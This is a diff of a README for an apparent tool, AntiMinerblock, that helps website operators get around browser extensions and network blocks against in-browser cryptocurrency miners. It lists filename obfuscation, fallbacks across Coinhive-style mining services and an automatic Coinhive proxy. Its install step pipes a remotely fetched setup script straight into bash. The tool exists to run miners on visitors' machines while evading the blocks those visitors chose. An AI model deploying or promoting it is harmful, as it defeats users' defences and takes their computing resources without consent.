@@ -4,9 +4,13 @@ This script attempts to bypass extensions or network blocks that prevent the use
 ## Features
 * Obfuscates filenames per server
 * Attempts to use Coinhive, Crypto-loot, and Cloudcoins, in that order.
+* Starts a proxy for coinhive on the server automatically
 
 ## Installation
 ### Ubuntu/Unix
+First, make sure you have Node.js installed:
+https://nodejs.org/en/download/package-manager/
+
 Navigate to your server's scripts directory and run
 ```bash
 bash <(curl -s https://raw.githubusercontent.com/SkyrisBactera/AntiMinerblock/master/setup.sh)
